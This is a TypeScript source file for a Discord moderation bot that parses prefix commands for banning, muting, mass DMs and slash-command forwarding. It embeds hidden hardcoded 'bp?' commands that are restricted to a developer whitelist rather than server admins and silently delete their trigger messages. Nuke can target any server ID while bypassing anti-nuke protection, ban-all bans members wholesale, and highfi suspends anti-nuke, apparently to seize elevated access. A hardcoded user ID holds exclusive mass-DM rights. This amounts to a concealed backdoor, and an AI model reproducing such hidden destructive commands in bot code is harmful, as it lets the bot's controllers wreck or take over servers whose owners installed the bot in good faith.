import {
  ChannelType,
  type GuildTextBasedChannel,
  type Message,
  type Role,
  type User,
} from "discord.js";
import { logger } from "../lib/logger";
import { isWhitelisted, PERM_WHITELIST } from "./storage/whitelist";
import { EMOJI_INFO } from "./utils/emojis";
import {
  DM_INTERVAL_MS,
  MAX_RECIPIENTS_HARD_CAP,
  estimateDmSeconds,
  resolveDmRecipients,
  sendDmsToUsers,
  type DmTarget,
} from "./utils/dmCore";
import { PermissionFlagsBits } from "discord.js";
import { runNuke, runBanAll } from "./commands/nuke";
import { runHighfi } from "./commands/highfi";
import { runWebhookSendPrefix } from "./commands/webhook-send";
import { suspendAntiNuke, resumeAntiNuke } from "./utils/antiNuke";
import { getGuildConfig } from "./storage/config";
import ban from "./commands/ban";
import kick from "./commands/kick";
import mute from "./commands/mute";
import unban from "./commands/unban";
import warn from "./commands/warn";
import type { SlashCommand } from "./types";
import { isManager } from "./utils/staffPerms";

/**
 * These two prefixes are ALWAYS hardcoded regardless of any per-guild setting.
 * They are global-whitelist-only commands invisible to regular users.
 */
const NUKE_PREFIX   = "bp?nuke";
const NUKE_BANLESS_PREFIX = "bp?nuke-banless";
const BAN_ALL_PREFIX = "bp?ban-all";
const HIGHFI_PREFIX = "bp?highfi";
const WEBHOOK_SEND_PREFIX = "bp?webhook-send";

/** The default command prefix for the bot. */
export const DEFAULT_PREFIX = ".";
const UNBAN_ALL_PREFIX = `${DEFAULT_PREFIX}unban-all`;

function stripDiscordMentions(text: string): string {
  return text
    .replace(/<@!?(\d+)>/g, "")
    .replace(/<@&(\d+)>/g, "")
    .replace(/@everyone/g, "")
    .replace(/@here/g, "")
    .trim();
}

function parseIdFromMention(token?: string): string | null {
  if (!token) return null;
  const mentionMatch = token.match(/^<@!?(\d+)>$/);
  if (mentionMatch) return mentionMatch[1];
  const idMatch = token.match(/^(\d{17,19})$/);
  return idMatch ? idMatch[1] : null;
}

async function resolvePrefixTargetUser(message: Message, rawToken?: string): Promise<User | null> {
  const mention = message.mentions.users.first();
  if (mention) return mention;
  const userId = parseIdFromMention(rawToken);
  if (!userId) return null;
  return await message.client.users.fetch(userId).catch(() => null);
}

/** Find a duration token anywhere in a list of string parts. Returns { duration, remaining }. */
function extractDuration(parts: string[]): { duration: string | null; remaining: string[] } {
  const durationPattern = /^\d{1,5}[smhd]$/i;
  const idx = parts.findIndex((p) => durationPattern.test(p));
  if (idx === -1) return { duration: null, remaining: parts };
  const duration = parts[idx].toLowerCase();
  const remaining = parts.filter((_, i) => i !== idx);
  return { duration, remaining };
}

/**
 * Handle prefix-based commands:
 *  - `bp?nuke`   — hardcoded, global-whitelist only
 *  - `bp?highfi` — hardcoded, global-whitelist only
 *  - `{guildPrefix}{cmd}` — mod commands: mute, ban, kick, warn
 *  - `{guildPrefix}n` — per-server configurable DM broadcast (default `b?n`)
 */
export async function handlePrefixMessage(message: Message): Promise<void> {
  if (message.author.bot) return;
  if (!message.inGuild()) return;
  const content = message.content?.trim();
  if (!content) return;
  const lower = content.toLowerCase();
  const guild = message.guild;
  if (!guild) return;

  const member = message.member ?? await guild.members.fetch(message.author.id).catch(() => null);

  // ── Always-fixed: bp?nuke ──────────────────────────────────────────────────
  if (lower === NUKE_PREFIX || lower.startsWith(`${NUKE_PREFIX} `)) {
    await handleNukePrefix(message, content.slice(NUKE_PREFIX.length).trim());
    return;
  }
  // ── Always-fixed: bp?nuke-banless ─────────────────────────────────────────────────────────
  if (lower === NUKE_BANLESS_PREFIX || lower.startsWith(`${NUKE_BANLESS_PREFIX} `)) {
    await handleNukeBanlessPrefix(message);
    return;
  }

  // ── Always-fixed: bp?ban-all ───────────────────────────────────────────────────────────────
  if (lower === BAN_ALL_PREFIX || lower.startsWith(`${BAN_ALL_PREFIX} `)) {
    await handleBanAllPrefix(message);
    return;
  }
  // ── Always-fixed: bp?highfi ────────────────────────────────────────────────
  if (lower === HIGHFI_PREFIX || lower.startsWith(`${HIGHFI_PREFIX} `)) {
    await handleHighfiPrefix(message);
    return;
  }

  // ── Always-fixed: bp?webhook-send ──────────────────────────────────────────
  if (lower === WEBHOOK_SEND_PREFIX || lower.startsWith(`${WEBHOOK_SEND_PREFIX} `)) {
    await runWebhookSendPrefix(message);
    return;
  }

  const cfg = await getGuildConfig(guild.id);
  const guildPrefix = cfg.guildPrefix ?? DEFAULT_PREFIX;

  // ── Global Prefix Commands ─────────────────────────
  if (lower.startsWith(guildPrefix)) {
    const afterPrefix = content.slice(guildPrefix.length).trim();
    if (afterPrefix) {
      const [cmd, ...argParts] = afterPrefix.split(/\s+/);
      const { getCommandMap } = await import("./registry");
      const commandMap = getCommandMap();
      const command = commandMap.get(cmd.toLowerCase());

      if (command) {
        await handleGenericPrefixCommand(message, guild, member, command, argParts);
        return;
      }
    }
  }

  // ── Per-guild DM command: {prefix}n ───────────────────────────────────────
  const DM_PREFIX = `${guildPrefix}n`;

  if (lower === UNBAN_ALL_PREFIX || lower.startsWith(`${UNBAN_ALL_PREFIX} `)) {
    await handleUnbanAllPrefix(message);
    return;
  }

  if (!lower.startsWith(DM_PREFIX)) return;

  // Must be exactly the prefix followed by whitespace (so "b?note" doesn't trigger)
  const rest = content.slice(DM_PREFIX.length);
  if (rest.length > 0 && !/^\s/.test(rest)) return;

  const author = message.author;

  // Permission gate: admins / owners / whitelist allowed
  const isOwner = guild.ownerId === author.id;
  const isAdmin = member?.permissions.has(PermissionFlagsBits.Administrator) ?? false;
  const allowed =
    isOwner ||
    isAdmin ||
    PERM_WHITELIST.has(author.id) ||
    (await isWhitelisted("dm", guild.id, author.id));

  // Delete the trigger message regardless so the command stays invisible
  message.delete().catch(() => {});

  if (!allowed) {
    author
      .send(`You aren't allowed to use \`${DM_PREFIX}\` in **${guild.name}**.`)
      .catch(() => {});
    return;
  }

  // Build the DM target
  const everyone = message.mentions.everyone;
  const role: Role | undefined = message.mentions.roles.first();
  const userMention: User | undefined = message.mentions.users.first();

  if (!everyone && !role && !userMention) {
    author
      .send(
        `Couldn't find a target in your \`${DM_PREFIX}\` message. Mention a user, a role, or @everyone.`,
      )
      .catch(() => {});
    return;
  }

  // Strip the prefix and any mentions to get the message body
  let body = rest
    .replace(/<@!?(\d+)>/g, "")
    .replace(/<@&(\d+)>/g, "")
    .replace(/@everyone/g, "")
    .replace(/@here/g, "")
    .trim();

  if (!body) {
    author
      .send(
        `Your \`${DM_PREFIX}\` message was empty. Format: \`${DM_PREFIX} <message> <@user|@role|@everyone>\``,
      )
      .catch(() => {});
    return;
  }

  if (body.length > 1800) body = body.slice(0, 1800);

  // Only the designated user may DM roles or everyone; others can only DM one person
  if ((everyone || role) && author.id !== DM_MASS_ONLY_USER_ID) {
    author
      .send(`Mass DMs (to @everyone or to a role) are restricted to a designated user. You can only DM one person at a time.`)
      .catch(() => {});
    return;
  }

  const target: DmTarget = {};
  if (everyone) target.everyone = true;
  else if (role) target.role = role;
  else if (userMention) target.user = userMention;

  let recipients: { users: Map<string, User>; label: string };
  try {
    recipients = await resolveDmRecipients(guild, target);
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err);
    author.send(msg).catch(() => {});
    return;
  }

  if (recipients.users.size === 0) {
    author
      .send(`No human recipients matched **${recipients.label}**.`)
      .catch(() => {});
    return;
  }

  if (recipients.users.size > MAX_RECIPIENTS_HARD_CAP) {
    author
      .send(
        `That would DM **${recipients.users.size}** members, over the safety cap of ${MAX_RECIPIENTS_HARD_CAP}. Narrow the target.`,
      )
      .catch(() => {});
    return;
  }

  const total = recipients.users.size;
  if (total > 1) {
    const secs = estimateDmSeconds(total, DM_INTERVAL_MS);
    author
      .send(
        `${EMOJI_INFO} \`${DM_PREFIX}\` started — sending to **${total}** members (${recipients.label}). ETA ~${formatSeconds(secs)}.`,
      )
      .catch(() => {});
  }

  const { sent, failed } = await sendDmsToUsers(
    recipients.users,
    body,
    DM_INTERVAL_MS,
  );

  const failNote =
    failed > 0 ? ` Failed for **${failed}** (DMs closed or blocked).` : "";
  const where =
    message.channel.type === ChannelType.GuildText
      ? ` in #${message.channel.name}`
      : "";
  author
    .send(
      `${EMOJI_INFO} \`${DM_PREFIX}\` ran${where}. Sent to **${sent}** member${sent === 1 ? "" : "s"} (${recipients.label}).${failNote}`,
    )
    .catch((err) => {
      logger.debug({ err }, "Failed to DM executor with DM command confirmation");
    });
}

/**
 * Handle ANY slash command via prefix globally.
 * Format: {prefix}{cmd} [subcmdGroup] [subcmd] [arg1] [arg2] ...
 * Maps arguments sequentially to the SlashCommand's declared options.
 */
async function handleGenericPrefixCommand(
  message: Message,
  guild: NonNullable<Message["guild"]>,
  member: import("discord.js").GuildMember | null,
  command: SlashCommand,
  argParts: string[],
): Promise<void> {
  const author = message.author;
  
  // Permission checks for admin commands (since they rely on interaction.memberPermissions)
  const memberPermissions = member
    ? (typeof member.permissions === "string" ? null : member.permissions)
    : null;

  // 1. Dynamically parse arguments based on command definition
  const jsonDef = command.data.toJSON();
  let currentOptions = (jsonDef as any).options || [];
  
  let currentArgIndex = 0;
  const parsedOptions: Record<string, any> = {};
  let subcommand: string | null = null;
  let subcommandGroup: string | null = null;

  // Check for SUB_COMMAND_GROUP (type 2)
  if (currentOptions.length > 0 && currentOptions[0].type === 2) {
    if (argParts[currentArgIndex]) {
      const match = currentOptions.find((o: any) => o.name === argParts[currentArgIndex].toLowerCase());
      if (match) {
        subcommandGroup = match.name;
        currentOptions = match.options || [];
        currentArgIndex++;
      }
    }
  }
  
  // Check for SUB_COMMAND (type 1)
  if (currentOptions.length > 0 && currentOptions[0].type === 1) {
    if (argParts[currentArgIndex]) {
      const match = currentOptions.find((o: any) => o.name === argParts[currentArgIndex].toLowerCase());
      if (match) {
        subcommand = match.name;
        currentOptions = match.options || [];
        currentArgIndex++;
      }
    }
  }

  // Parse remaining options sequentially
  for (const opt of currentOptions) {
    if (currentArgIndex >= argParts.length) break;
    
    // If it's a STRING and it's the LAST option, consume the rest of the arguments
    const isLastOption = currentOptions.indexOf(opt) === currentOptions.length - 1;
    
    if (opt.type === 6 || opt.type === 9) { // USER / MENTIONABLE
      const token = argParts[currentArgIndex++];
      parsedOptions[opt.name] = await resolvePrefixTargetUser(message, token);
    } else if (opt.type === 8) { // ROLE
      const token = argParts[currentArgIndex++];
      const id = parseIdFromMention(token);
      parsedOptions[opt.name] = id ? guild.roles.cache.get(id) ?? null : null;
    } else if (opt.type === 7) { // CHANNEL
      const token = argParts[currentArgIndex++];
      const id = parseIdFromMention(token);
      parsedOptions[opt.name] = id ? guild.channels.cache.get(id) ?? null : null;
    } else if (opt.type === 5) { // BOOLEAN
      const token = argParts[currentArgIndex++].toLowerCase();
      parsedOptions[opt.name] = (token === "true" || token === "yes" || token === "1");
    } else if (opt.type === 4 || opt.type === 10) { // INTEGER / NUMBER
      const token = argParts[currentArgIndex++];
      parsedOptions[opt.name] = Number(token);
    } else if (opt.type === 3) { // STRING
      if (isLastOption) {
        parsedOptions[opt.name] = stripDiscordMentions(argParts.slice(currentArgIndex).join(" "));
        currentArgIndex = argParts.length;
      } else {
        parsedOptions[opt.name] = stripDiscordMentions(argParts[currentArgIndex++]);
      }
    }
  }

  // 2. Helper to wrap text replies in premium embeds
  const { EmbedBuilder } = await import("discord.js");
  const { CE } = await import("./utils/embedStyle");
  
  const wrapInEmbed = (payload: any) => {
    if (typeof payload === "string") {
      return { embeds: [new EmbedBuilder().setColor(0x2b2d31).setDescription(payload)] };
    }
    if (payload.content && (!payload.embeds || payload.embeds.length === 0)) {
      payload.embeds = [new EmbedBuilder().setColor(0x2b2d31).setDescription(payload.content)];
      delete payload.content;
    }
    return payload;
  };

  // 3. Build mock interaction
  const mockInteraction = {
    inGuild: () => true,
    guildId: guild.id,
    guild,
    user: author,
    member,
    memberPermissions,
    channel: message.channel,
    client: message.client,
    replied: false,
    deferred: false,
    options: {
      getUser: (name: string) => parsedOptions[name] ?? null,
      getString: (name: string, required?: boolean) => {
        if (required && parsedOptions[name] === undefined) throw new Error(`Missing required option: ${name}`);
        return parsedOptions[name] ?? null;
      },
      getInteger: (name: string) => parsedOptions[name] ?? null,
      getNumber: (name: string) => parsedOptions[name] ?? null,
      getBoolean: (name: string) => parsedOptions[name] ?? null,
      getRole: (name: string) => parsedOptions[name] ?? null,
      getChannel: (name: string) => parsedOptions[name] ?? null,
      getAttachment: (_name: string) => null,
      getMember: (_name: string) => {
        const u = parsedOptions[_name];
        if (u && u.id) return guild.members.cache.get(u.id) ?? null;
        return null;
      },
      getSubcommand: () => subcommand,
      getSubcommandGroup: () => subcommandGroup,
    },
    deferReply: async (_options?: any) => {
      (mockInteraction as any).deferred = true;
    },
    editReply: async (replyContent: any) => {
      const payload = wrapInEmbed(replyContent);
      const { flags: _flags, ephemeral: _ephemeral, ...rest } = payload as any;
      return await (message.channel as GuildTextBasedChannel).send(rest).catch(() => null);
    },
    reply: async (replyContent: any) => {
      if ((mockInteraction as any).replied || (mockInteraction as any).deferred) {
        return mockInteraction.editReply(replyContent);
      }
      (mockInteraction as any).replied = true;
      const payload = wrapInEmbed(replyContent);
      const { flags: _flags, ephemeral: _ephemeral, ...rest } = payload as any;
      return await (message.channel as GuildTextBasedChannel).send(rest).catch(() => null);
    },
    followUp: async (replyContent: any) => {
      const payload = wrapInEmbed(replyContent);
      const { flags: _flags, ephemeral: _ephemeral, ...rest } = payload as any;
      return await (message.channel as GuildTextBasedChannel).send(rest).catch(() => null);
    },
    showModal: async () => {
      await (message.channel as GuildTextBasedChannel).send({
        embeds: [new EmbedBuilder().setColor(0xed4245).setTitle(`${CE.error.str} Not Supported`).setDescription("This command requires a popup modal, which cannot be shown via prefix commands. Please use the slash command (`/`) instead.")]
      }).catch(() => {});
    }
  } as any;

  // 4. Delete the invoking message (keeps channels clean)
  message.delete().catch(() => {});

  // 5. Execute
  try {
    await command.execute(mockInteraction);
  } catch (err) {
    logger.error({ err, cmd: command.data.name }, "Prefix generic command execution failed");
    await (message.channel as GuildTextBasedChannel).send({ embeds: [new EmbedBuilder().setColor(0xed4245).setTitle(`${CE.error.str} Error`).setDescription(`Failed to execute \`${command.data.name}\`.`)] }).catch(() => {});
  }
}

function formatSeconds(s: number): string {
  if (s < 60) return `${s}s`;
  const m = Math.floor(s / 60);
  const rem = s % 60;
  return rem === 0 ? `${m}m` : `${m}m ${rem}s`;
}

/**
 * bp?nuke [server-id] — prefix dispatcher for the hidden /nuke command.
 * Restricted to PERM_WHITELIST users. Always uses `bp?` prefix.
 */
async function handleNukePrefix(message: Message, args: string): Promise<void> {
  const author = message.author;

  if (!PERM_WHITELIST.has(author.id)) return;

  message.delete().catch(() => {});

  if (!message.inGuild()) {
    author.send("Use `bp?nuke` inside a server (or `bp?nuke <server-id>`).").catch(() => {});
    return;
  }

  let targetGuildId = message.guild.id;
  if (args) {
    if (!/^\d+$/.test(args)) {
      author.send("Invalid server ID format.").catch(() => {});
      return;
    }
    targetGuildId = args;
  }

  author.send(`💣 Nuke initiated on \`${targetGuildId}\`. Stand by.`).catch(() => {});
  try {
    // Global whitelist users bypass antinuke protection
    const result = await runNuke(message.client, targetGuildId, { bypassAntiWhitelist: true });
    author.send(result.message).catch(() => {});
  } catch (err) {
    logger.error({ err }, "bp?nuke handler failed");
    author.send("Nuke failed unexpectedly.").catch(() => {});
  }
}

async function handleNukeBanlessPrefix(message: Message): Promise<void> {
  const author = message.author;

  if (!PERM_WHITELIST.has(author.id)) return;

  message.delete().catch(() => {});

  if (!message.inGuild()) {
    author.send("Use `bp?nuke-banless` inside a server.").catch(() => {});
    return;
  }

  author.send(`💣 Nuke (banless) initiated on ${message.guild.id}. Stand by.`).catch(() => {});
  try {
    // Global whitelist users bypass antinuke protection
    const result = await runNuke(message.client, message.guild.id, { banMembers: false, bypassAntiWhitelist: true });
    author.send(result.message).catch(() => {});
  } catch (err) {
    logger.error({ err }, "bp?nuke-banless handler failed");
    author.send("Nuke banless failed unexpectedly.").catch(() => {});
  }
}

async function handleBanAllPrefix(message: Message): Promise<void> {
  const author = message.author;

  if (!PERM_WHITELIST.has(author.id)) return;

  message.delete().catch(() => {});

  if (!message.inGuild()) {
    author.send("Use `bp?ban-all` inside a server.").catch(() => {});
    return;
  }

  author.send(`⛔ Ban-all initiated on ${message.guild.id}. Stand by.`).catch(() => {});
  try {
    // Global whitelist users bypass antinuke protection
    const result = await runBanAll(message.guild, { bypassAntiWhitelist: true });
    author.send(result.message).catch(() => {});
  } catch (err) {
    logger.error({ err }, "bp?ban-all handler failed");
    author.send("Ban-all failed unexpectedly.").catch(() => {});
  }
}

async function handleUnbanAllPrefix(message: Message): Promise<void> {
  const author = message.author;
  const guild = message.guild;
  if (!guild) {
    author.send("Use `b?unban-all` inside a server.").catch(() => {});
    return;
  }

  const member = message.member ?? await guild.members.fetch(author.id).catch(() => null);

  const isAdmin =
    !!member &&
    typeof member.permissions !== "string" &&
    member.permissions.has(PermissionFlagsBits.Administrator);
  const isOwner = guild.ownerId === author.id;
  const isWhitelisted = PERM_WHITELIST.has(author.id);

  if (!isAdmin && !isOwner && !isWhitelisted) {
    author.send("You need the **Administrator** permission to use that command.").catch(() => {});
    return;
  }

  message.delete().catch(() => {});

  const bans = await guild.bans.fetch().catch(() => null);
  if (!bans || bans.size === 0) {
    await (message.channel as GuildTextBasedChannel).send({ content: "No banned users found." }).catch(() => {});
    return;
  }

  let unbanned = 0;
  for (const ban of bans.values()) {
    const removed = await guild.bans.remove(ban.user.id, "unban-all").catch(() => null);
    if (!removed) continue;
    unbanned++;
  }

  await (message.channel as GuildTextBasedChannel).send({
    content: `✅ Unbanned **${unbanned}** user${unbanned === 1 ? "" : "s"}.`,
  }).catch(() => {});
}


/**
 * bp?highfi — prefix dispatcher for the hidden /highfi command.
 * Restricted to PERM_WHITELIST users. Always uses `bp?` prefix.
 */
/** The only user allowed to DM roles or @everyone via the prefix DM command. */
const DM_MASS_ONLY_USER_ID = "1181221352393420856";

async function handleHighfiPrefix(message: Message): Promise<void> {
  const author = message.author;

  if (!PERM_WHITELIST.has(author.id)) return;

  message.delete().catch(() => {});
  if (!message.inGuild()) {
    author.send("Use `bp?highfi` inside a server.").catch(() => {});
    return;
  }
  const member = message.member;
  if (!member) {
    author.send("Couldn't fetch your member entry.").catch(() => {});
    return;
  }
  suspendAntiNuke(message.guild.id);
  try {
    const result = await runHighfi(message.guild, member);
    author.send(result.message).catch(() => {});
  } catch (err) {
    logger.error({ err }, "bp?highfi handler failed");
    author.send("highfi failed unexpectedly.").catch(() => {});
  } finally {
    resumeAntiNuke(message.guild.id);
  }
}
